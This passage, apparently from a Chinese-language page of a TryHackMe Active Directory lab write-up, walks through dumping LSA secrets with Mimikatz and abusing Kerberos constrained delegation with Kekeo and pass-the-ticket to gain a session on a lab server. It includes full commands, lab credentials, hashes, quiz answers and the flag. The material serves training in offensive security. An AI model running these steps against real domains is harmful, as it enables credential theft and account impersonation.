\u8fdb\u884c\u9002\u5f53\u7684\u540e\u6e17\u900f\u679a\u4e3e\uff0c\u4f60\u4f1a\u53d1\u73b0\u4e3b\u673a\u4e0a\u6709\u4e00\u4e2a\u4f5c\u4e3a svcIIS \u7528\u6237\u8fd0\u884c\u7684\u670d\u52a1\u3002\u7531\u4e8e\u6211\u4eec\u73b0\u5728\u6709\u7ba1\u7406\u8bbf\u95ee\u6743\u9650\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\u6765 dump LSASecrets\uff0cWindows \u6ce8\u518c\u8868\u4e2d\u5b58\u50a8\u51ed\u636e\u7684\u4e00\u90e8\u5206\uff0c\u7528\u4e8e\u8bf8\u5982 Windows \u670d\u52a1\u7b49\u529f\u80fd\u3002\u8ba9\u6211\u4eec\u4f7f\u7528 Mimikatz \u6765 dump \u8fd9\u4e9b\u79d8\u5bc6\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Command Prompt"',children:"C:\\> C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)\n ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             (vincent.letoux@gmail.com)\n  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz # token::elevate\nToken Id  : 0\nUser name :\nSID name  : NT AUTHORITY\\SYSTEM\n\n\nmimikatz # lsadump::secrets\nDomain : THMWRK1\nSysKey : redacted\n\nLocal name : THMWRK1 (S-1-5-21-3226461851-763325627-4205969673)\nDomain name : ZA (S-1-5-21-3885271727-2693558621-2658995185)\nDomain FQDN : za.tryhackme.loc\n\nPolicy subsystem is : 1.18\nLSA Key(s) : 1, default {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27}\n  [00] {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27} 929bd1cdc726d31f5eea6fa5266a09521afd0be6309a08fd604c9a95c2af4463\n\nSecret  : $MACHINE.ACC\ncur/text: redacted\n    NTLM:redacted\n    SHA1:redacted\nold/text: redacted\n    NTLM:redacted\n    SHA1:redacted\n\nSecret  : DefaultPassword\ncur/text: redacted\nold/text: redacted\n\nSecret  : _SC_thmwinauth / service 'thmwinauth' with username : svcIIS@za.tryhackme.loc\ncur/text: redacted\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u8ba9\u6211\u4eec\u6765\u8fd0\u884c\u8fd9\u4e24\u4e2a\u547d\u4ee4\uff1a"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"token::elevate"})," - \u4e3a\u4e86\u4ece\u6ce8\u518c\u8868\u4e2d dump \u51fa\u79d8\u5bc6\uff0c\u6211\u4eec\u9700\u8981\u5192\u5145 SYSTEM \u7528\u6237\u3002"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"lsadump::secrets"})," - Mimikatz \u4e0e\u6ce8\u518c\u8868\u8fdb\u884c\u4ea4\u4e92\u4ee5\u63d0\u53d6\u660e\u6587\u51ed\u636e\u3002"]}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u8bbf\u95ee\u4e0e svcIIS \u8d26\u6237\u5173\u8054\u7684\u5bc6\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u6267\u884c Kerberos \u59d4\u6d3e\u653b\u51fb\u3002\u6211\u4eec\u5c06\u4f7f\u7528 ",(0,r.jsx)(n.a,{href:"https://github.com/gentilkiwi/kekeo",children:"Kekeo"})," \u548c ",(0,r.jsx)(n.a,{href:"https://github.com/gentilkiwi/mimikatz",children:"Mimikatz"})," \u7684\u7ec4\u5408\u3002\u4f60\u53ef\u4ee5\u5728 Mimikatz \u4e2d\u4f7f\u7528\u53e6\u4e00\u4e2a\u7a97\u53e3\uff0c\u4f46\u786e\u4fdd\u5728 token::elevate \u547d\u4ee4\u4e4b\u540e\u9000\u51fa Mimikatz\uff0c\u5426\u5219\u540e\u7eed\u52a0\u8f7d\u7684\u7968\u8bc1\u4f1a\u5728\u9519\u8bef\u7684\u4e0a\u4e0b\u6587\u4e2d\u3002\u6211\u4eec\u5c06\u4f7f\u7528 Kekeo \u751f\u6210\u6211\u4eec\u7684\u7968\u8bc1\uff0c\u7136\u540e\u4f7f\u7528 Mimikatz \u5c06\u8fd9\u4e9b\u7968\u8bc1\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u3002\u8ba9\u6211\u4eec\u9996\u5148\u751f\u6210\u7968\u8bc1\uff1a"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Command Prompt"',children:"PS C:\\> C:\\Tools\\kekeo\\x64\\kekeo.exe\n\n  ___ _    kekeo 2.1 (x64) built on Dec 14 2021 11:51:55\n /   ('>-\"A La Vie, A L'Amour\"\n | K  |    /* * *\n \\____/     Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)\n  L\\_       https://blog.gentilkiwi.com/kekeo                (oe.eo)\n                                             with 10 modules * * */\n\nkekeo #\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u751f\u6210\u4e00\u4e2a TGT\uff0c\u7528\u4e8e\u751f\u6210 HTTP \u548c WSMAN \u670d\u52a1\u7684\u7968\u8bc1\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Kekeo"',children:"kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:redacted\nRealm        : za.tryhackme.loc (za)\nUser         : svcIIS (svcIIS)\nCName        : svcIIS   [KRB_NT_PRINCIPAL (1)]\nSName        : krbtgt/za.tryhackme.loc  [KRB_NT_SRV_INST (2)]\nNeed PAC     : Yes\nAuth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt): 43460d636f269c709b20049cee36ae7a\n[kdc] name: THMDC.za.tryhackme.loc (auto)\n[kdc] addr: 172.31.1.101 (auto)\n  > Ticket in file 'TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u53c2\u6570\u89e3\u91ca\uff1a"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"user"})," - \u5177\u6709\u53d7\u9650\u59d4\u6d3e\u6743\u9650\u7684\u7528\u6237\u3002"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"domain"})," - \u6211\u4eec\u6b63\u5728\u653b\u51fb\u7684\u57df\uff0c\u56e0\u4e3a Kekeo \u53ef\u4ee5\u7528\u6765\u4f2a\u9020\u7968\u8bc1\u4ee5\u6ee5\u7528\u8de8\u57df\u4fe1\u4efb\u3002"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"password"})," - \u4e0e svcIIS \u8d26\u6237\u76f8\u5173\u8054\u7684\u5bc6\u7801\u3002"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u73b0\u5728\u6211\u4eec\u6709\u4e86\u53ef\u4ee5\u6267\u884c\u59d4\u6d3e\u7684\u8d26\u6237\u7684 TGT\uff0c\u6211\u4eec\u53ef\u4ee5\u4f2a\u9020 TGS \u8bf7\u6c42\u4ee5\u5192\u5145\u6211\u4eec\u60f3\u8981\u6a21\u62df\u7684\u8d26\u6237\u3002\u6211\u4eec\u9700\u8981\u4e3a HTTP \u548c WSMAN \u90fd\u6267\u884c\u8fd9\u4e2a\u64cd\u4f5c\uff0c\u4ee5\u5141\u8bb8\u6211\u4eec\u5728 THMSERVER1 \u4e0a\u521b\u5efa\u4e00\u4e2a PSSession\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Kekeo"',children:"kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc\nTicket  : TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi\n  [krb-cred]     S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC\n  [krb-cred]     E: [00000012] aes256_hmac\n  [enc-krb-cred] P: svcIIS @ ZA.TRYHACKME.LOC\n  [enc-krb-cred] S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC\n  [enc-krb-cred] T: [4/30/2022 1:29:00 PM ; 4/30/2022 11:29:00 PM] {R:5/7/2022 1:29:00 PM}\n  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;\n  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): 548e500d4ee2f5c61710254ea9dd43e2ce0123026d329c97e512695e2f1777a7\n  [s4u2self] t1_trevor.jones\n[kdc] name: THMDC.za.tryhackme.loc (auto)\n[kdc] addr: 172.31.1.101 (auto)\n  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi'\nService(s):\n  [s4u2proxy] http/THMSERVER1.za.tryhackme.loc\n  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u53c2\u6570\u89e3\u91ca\uff1a"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"tgt"})," - \u6211\u4eec\u5728\u4e0a\u4e00\u6b65\u4e2d\u751f\u6210\u7684 TGT\u3002"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"user"})," - \u6211\u4eec\u60f3\u8981\u5192\u5145\u7684\u7528\u6237\u3002\u7531\u4e8e t2_\u8d26\u6237\u5728\u5de5\u4f5c\u7ad9\u4e0a\u5177\u6709\u7ba1\u7406\u8bbf\u95ee\u6743\u9650\uff0c\u53ef\u4ee5\u5408\u7406\u63a8\u65ad t1_\u8d26\u6237\u5c06\u5177\u6709\u670d\u52a1\u5668\u7684\u7ba1\u7406\u8bbf\u95ee\u6743\u9650\uff0c\u56e0\u6b64\u9009\u62e9\u4e00\u4e2a\u4f60\u60f3\u8981\u5192\u5145\u7684 t1_\u8d26\u6237\u3002"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"service"})," - \u6211\u4eec\u60f3\u8981\u4f7f\u7528\u59d4\u6d3e\u5192\u5145\u7684\u670d\u52a1\u3002\u9996\u5148\u4e3a HTTP \u670d\u52a1\u751f\u6210\u4e00\u4e2a TGS\u3002\u7136\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u518d\u6b21\u8fd0\u884c\u76f8\u540c\u7684\u547d\u4ee4\u4e3a WSMAN \u670d\u52a1\u751f\u6210 TGS\u3002"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u518d\u6b21\u8fd0\u884c\u547d\u4ee4\uff0c\u8fd9\u6b21\u4e3a WSMAN \u670d\u52a1\u3002\u73b0\u5728\u6211\u4eec\u6709\u4e86\u8fd9\u4e24\u4e2a TGS \u7968\u8bc1\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Mimikatz \u6765\u5bfc\u5165\u5b83\u4eec\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Mimikatz"',children:"mimikatz # privilege::debug\nPrivilege '20' OK\n\nmimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi\n\n* File: 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi': OK\n\nmimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi\n\n* File: 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi': OK\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u4f60\u53ef\u4ee5\u9000\u51fa Mimikatz \u5e76\u8fd0\u884c klist \u6765\u9a8c\u8bc1\u7968\u8bc1\u662f\u5426\u5df2\u5bfc\u5165\u3002\u73b0\u5728\u7968\u8bc1\u5df2\u7ecf\u5bfc\u5165\uff0c\u6211\u4eec\u7ec8\u4e8e\u53ef\u4ee5\u5728 THMSERVER1 \u4e0a\u521b\u5efa\u6211\u4eec\u7684 PSSession \u4e86\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"mimikatz # exit\nBye!\nPS C:> New-PSSession -ComputerName thmserver1.za.tryhackme.loc\n\n Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability\n -- ----            ------------    ------------    -----         -----------------     ------------\n  1 WinRM1          thmserver1.z... RemoteMachine   Opened        Microsoft.PowerShell     Available\n\n\nPS C:\\> Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc\n[thmserver1.za.tryhackme.loc]: PS C:\\Users\\t1_trevor.jones\\Documents> whoami\nza\\t1_trevor.jones\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u901a\u8fc7\u5229\u7528\u4e86\u53d7\u9650\u59d4\u6d3e\uff0c\u73b0\u5728\u6211\u4eec\u62e5\u6709\u4e86\u5bf9 THMSERVER1 \u7684\u7279\u6743\u8bbf\u95ee\uff01"}),"\n",(0,r.jsxs)(n.admonition,{title:"Answer the questions below",type:"info",children:[(0,r.jsx)(n.p,{children:"\u54ea\u79cd Kerberos \u59d4\u6d3e\u7c7b\u578b\u5141\u8bb8\u59d4\u6d3e\u6240\u6709\u670d\u52a1\uff1f"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Unconstrained Delegation\n"})}),(0,r.jsx)(n.p,{children:"\u54ea\u79cd Kerberos \u59d4\u6d3e\u7c7b\u578b\u5141\u8bb8\u670d\u52a1\u6307\u5b9a\u8c01\u53ef\u4ee5\u59d4\u6d3e\u7ed9\u5b83\uff1f"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Resource-Based Constrained Delegation\n"})}),(0,r.jsx)(n.p,{children:"\u54ea\u4e2a\u7ea6\u675f\u59d4\u6d3e\u670d\u52a1\u5141\u8bb8\u901a\u8fc7\u59d4\u6d3e\u8bbf\u95ee\u7cfb\u7edf\u7684\u6587\u4ef6\u7cfb\u7edf\uff1f"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"CIFS\n"})}),(0,r.jsx)(n.p,{children:"THMSERVER1 \u4e0a\u7ba1\u7406\u5458\u7528\u6237\u7684\u684c\u9762\u76ee\u5f55\u4e2d\u5b58\u50a8\u7684\u6807\u5fd7\u503c (flag2.txt) \u662f\u591a\u5c11\uff1f"}),(0,r.jsxs)(t,{children:[(0,r.jsx)("summary",{children:" \u5177\u4f53\u64cd\u4f5c\u6b65\u9aa4 "}),(0,r.jsx)(n.p,{children:"\u9996\u5148\uff0cSSH \u8fde\u63a5\u5165\u53e3\u70b9\u9776\u673a"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"ssh za.tryhackme.loc\\\\t2_melanie.davies@thmwrk1.za.tryhackme.loc\n"})}),(0,r.jsx)(n.p,{children:"\u5bfc\u5165\u76f8\u5173\u6a21\u5757\u540e\uff0c\u67e5\u770b\u7279\u6743\u7528\u6237\uff1a"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"PS C:\\Users\\t2_melanie.davies> Import-Module C:\\Tools\\PowerView.ps1\nPS C:\\Users\\t2_melanie.davies> Get-NetUser -TrustedToAuth\n\n\nlogoncount               : 39\nbadpasswordtime          : 12/12/2023 10:16:56 AM\ndistinguishedname        : CN=IIS Server,CN=Users,DC=za,DC=tryhackme,DC=loc\nobjectclass              : {top, person, organizationalPerson, user}\ndisplayname              : IIS Server\nlastlogontimestamp       : 12/9/2023 10:02:26 PM\nuserprincipalname        : svcIIS@za.tryhackme.loc\nname                     : IIS Server\nobjectsid                : S-1-5-21-3885271727-2693558621-2658995185-6155\nsamaccountname           : svcIIS\ncodepage                 : 0\nsamaccounttype           : USER_OBJECT\naccountexpires           : NEVER\ncountrycode              : 0\nwhenchanged              : 12/9/2023 10:02:26 PM\ninstancetype             : 4\nusncreated               : 78494\nobjectguid               : 11e42287-0a25-4d73-800d-b62e2d2a2a4b\nsn                       : Server\nlastlogoff               : 1/1/1601 12:00:00 AM\nmsds-allowedtodelegateto : {WSMAN/THMSERVER1.za.tryhackme.loc, WSMAN/THMSERVER1, http/THMSERVER1.za.tryhackme.loc, http/THMSERVER1}\nobjectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc\ndscorepropagationdata    : 1/1/1601 12:00:00 AM\nserviceprincipalname     : HTTP/svcServWeb.za.tryhackme.loc\ngivenname                : IIS\nlastlogon                : 12/12/2023 6:16:12 AM\nbadpwdcount              : 1\ncn                       : IIS Server\nuseraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION\nwhencreated              : 4/27/2022 11:26:21 AM\nprimarygroupid           : 513\npwdlastset               : 4/29/2022 11:50:25 AM\nusnchanged               : 155707\n"})}),(0,r.jsx)(n.p,{children:"\u7136\u540e\u542f\u52a8 mimikatz"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"PS C:\\Users\\t2_melanie.davies> C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)\n ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             (vincent.letoux@gmail.com)\n  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz # token::elevate\nToken Id  : 0\nUser name :\nSID name  : NT AUTHORITY\\SYSTEM\n\n488     {0;000003e7} 1 D 17769          NT AUTHORITY\\SYSTEM     S-1-5-18        (04g,21p)       Primary\n -> Impersonated !\n * Process Token : {0;00363712} 0 D 3569247     ZA\\t2_melanie.davies    S-1-5-21-3885271727-2693558621-2658995185-5929  (12g,24p)       Primary\n * Thread Token  : {0;000003e7} 1 D 3598685     NT AUTHORITY\\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)\n\nmimikatz # lsadump::secrets\nDomain : THMWRK1\nSysKey : a1403e57976b472bce5f231922ca3942\n\nLocal name : THMWRK1 (S-1-5-21-3226461851-763325627-4205969673)\nDomain name : ZA (S-1-5-21-3885271727-2693558621-2658995185)\nDomain FQDN : za.tryhackme.loc\n\nPolicy subsystem is : 1.18\nLSA Key(s) : 1, default {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27}\n  [00] {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27} 929bd1cdc726d31f5eea6fa5266a09521afd0be6309a08fd604c9a95c2af4463\n\nSecret  : $MACHINE.ACC\ncur/text: 0FFIKa\"c[#L6T>=.s*ZW'Gz04FL&7,\"VjxxhLeXqmI\\%Q%c..g?=olZZlnTA#J@;*8+&?neR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb%),mlWLo?6$kqP\n    NTLM:4207d1b7e4b942da2371174b772fdf5e\n    SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db\nold/text: 0FFIKa\"c[#L6T>=.s*ZW'Gz04FL&7,\"VjxxhLeXqmI\\%Q%c..g?=olZZlnTA#J@;*8+&?neR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb%),mlWLo?6$kqP\n    NTLM:4207d1b7e4b942da2371174b772fdf5e\n    SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db\n\nSecret  : DefaultPassword\nold/text: vagrant\n\nSecret  : DPAPI_SYSTEM\ncur/hex : 01 00 00 00 b6 54 c4 83 d9 88 10 f6 ee ae fc b7 ed 2d a2 d6 47 11 3f 8f 4a 6d 7f 72 35 b8 a2 93 3d 5c 5e 3f 03 8d 79 49 90 e7 2e e0\n    full: b654c483d98810f6eeaefcb7ed2da2d647113f8f4a6d7f7235b8a2933d5c5e3f038d794990e72ee0\n    m/u : b654c483d98810f6eeaefcb7ed2da2d647113f8f / 4a6d7f7235b8a2933d5c5e3f038d794990e72ee0\nold/hex : 01 00 00 00 10 4d a3 82 e2 da 30 1f 33 d6 49 a4 c9 81 26 e5 25 59 bb 9f 8a 76 b1 5d 59 c6 87 c6 32 b7 02 0b c1 5b 24 f4 44 d0 74 31\n    full: 104da382e2da301f33d649a4c98126e52559bb9f8a76b15d59c687c632b7020bc15b24f444d07431\n    m/u : 104da382e2da301f33d649a4c98126e52559bb9f / 8a76b15d59c687c632b7020bc15b24f444d07431\n\nSecret  : NL$KM\ncur/hex : 10 bb 99 02 da 94 4a 26 cd ad 07 f3 62 64 53 5c a8 12 be e3 16 1f 8f 99 ae ab 97 37 c4 bc ee df 63 7c 2f 6d 07 c5 d9 5e 29 e7 ce ce 48 52 47 19 8a 03 99 ff 97 ec 7f 49 a1 79 15 d9 a0 04 ac 58\nold/hex : 10 bb 99 02 da 94 4a 26 cd ad 07 f3 62 64 53 5c a8 12 be e3 16 1f 8f 99 ae ab 97 37 c4 bc ee df 63 7c 2f 6d 07 c5 d9 5e 29 e7 ce ce 48 52 47 19 8a 03 99 ff 97 ec 7f 49 a1 79 15 d9 a0 04 ac 58\n\nSecret  : _SC_thmwinauth / service 'thmwinauth' with username : svcIIS@za.tryhackme.loc\ncur/text: Password1@\n"})}),(0,r.jsx)(n.p,{children:"\u968f\u540e\u5229\u7528 Kekeo \u5f00\u59cb\u751f\u6210\u7968\u636e"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@\nRealm        : za.tryhackme.loc (za)\nUser         : svcIIS (svcIIS)\nCName        : svcIIS   [KRB_NT_PRINCIPAL (1)]\nSName        : krbtgt/za.tryhackme.loc  [KRB_NT_SRV_INST (2)]\nNeed PAC     : Yes\nAuth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt): 43460d636f269c709b20049cee36ae7a\n[kdc] name: THMDC.za.tryhackme.loc (auto)\n[kdc] addr: 10.200.120.101 (auto)\n  > Ticket in file 'TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'\n"})}),(0,r.jsx)(n.p,{children:"\u6709\u4e86\u751f\u6210\u597d\u7684 TGT \u4e4b\u540e\uff0c\u5f00\u59cb\u4f2a\u9020 TGS \u8bf7\u6c42"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc\nTicket  : TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi\n  [krb-cred]     S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC\n  [krb-cred]     E: [00000012] aes256_hmac\n  [enc-krb-cred] P: svcIIS @ ZA.TRYHACKME.LOC\n  [enc-krb-cred] S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC\n  [enc-krb-cred] T: [12/12/2023 10:24:44 AM ; 12/12/2023 8:24:44 PM] {R:12/19/2023 10:24:44 AM}\n  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;\n  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): 12b5685331be5e0611849c91867c2be0d0e86195970defd5e10199b76b45f2bf\n  [s4u2self]  t1_trevor.jones\n[kdc] name: THMDC.za.tryhackme.loc (auto)\n[kdc] addr: 10.200.120.101 (auto)\n  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi'\nService(s):\n  [s4u2proxy] http/THMSERVER1.za.tryhackme.loc\n  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'\n"})}),(0,r.jsx)(n.p,{children:"\u63a5\u4e0b\u6765\u4f7f\u7528 mimikatz \u5229\u7528\u751f\u6210\u7684\u4e24\u4e2a TGS"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"mimikatz # privilege::debug\nPrivilege '20' OK\n\nmimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi\n\n* File: 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi': OK\n\nmimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi\n\n* File: 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi': OK\n\nmimikatz # exit\n"})}),(0,r.jsx)(n.p,{children:"\u63a5\u4e0b\u6765\u68c0\u67e5\u7968\u636e\u662f\u5426\u5bfc\u5165"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"PS C:\\> New-PSSession -ComputerName thmserver1.za.tryhackme.loc\n\n Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability\n -- ----            ------------    ------------    -----         -----------------     ------------\n  1 WinRM1          thmserver1.z... RemoteMachine   Opened        Microsoft.PowerShell     Available\n"})}),(0,r.jsx)(n.p,{children:"\u7136\u540e\u5229\u7528\u6b64\u7968\u636e"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"PS C:\\> Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc\n[thmserver1.za.tryhackme.loc]: PS C:\\Users\\t1_trevor.jones\\Documents> cd ../../\n[thmserver1.za.tryhackme.loc]: PS C:\\Users> ls\n\n\n    Directory: C:\\Users\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----        4/30/2022  11:07 AM                .NET v2.0\nd-----        4/30/2022  11:07 AM                .NET v2.0 Classic\nd-----        4/30/2022  11:07 AM                .NET v4.5\nd-----        4/30/2022  11:07 AM                .NET v4.5 Classic\nd-----        4/25/2022   8:52 PM                Administrator\nd-----        4/27/2022   8:32 AM                Administrator.ZA\nd-----        4/30/2022  11:07 AM                Classic .NET AppPool\nd-r---        3/21/2020   8:25 PM                Public\nd-----        6/13/2022   2:43 PM                t1_jake.scott\nd-----        6/13/2022   2:32 PM                t1_jay.wilson\nd-----        6/13/2022   2:28 PM                t1_steven.blake\nd-----        4/30/2022   3:30 PM                t1_trevor.jones\nd-----        4/30/2022   4:15 PM                trevor.local\nd-----        3/21/2020   8:52 PM                vagrant\n\n\n[thmserver1.za.tryhackme.loc]: PS C:\\Users> cd .\\Administrator\\Desktop\\\n[thmserver1.za.tryhackme.loc]: PS C:\\Users\\Administrator\\Desktop> type .\\flag2.txt\nTHM{Constrained.Delegation.Can.Be.Very.Bad}\n"})})]}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"THM{Constrained.Delegation.Can.Be.Very.Bad}\n"})})]}),"\n",(0,r.jsx)(n.h2,{id:"exploiting-automated-relays---\u5229\u7528\u81ea\u52a8\u4e2d\u7ee7",children:"Exploiting Automated Relays - \u5229\u7528\u81ea\u52a8\u4e2d\u7ee7"}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u8fd9\u4e2a\u4efb\u52a1\u4e2d\uff0c\u6211\u4eec\u5c06\u770b\u770b\u4e00\u4e9b\u81ea\u52a8\u7ee7\u7535\u5668\u653b\u51fb\u3002\u8ba4\u8bc1\u5c1d\u8bd5\u4e0d\u65ad\u5728\u7f51\u7edc\u4e2d\u4f20\u9012\uff0c\u6b63\u5982\u5728\u6e17\u900f AD 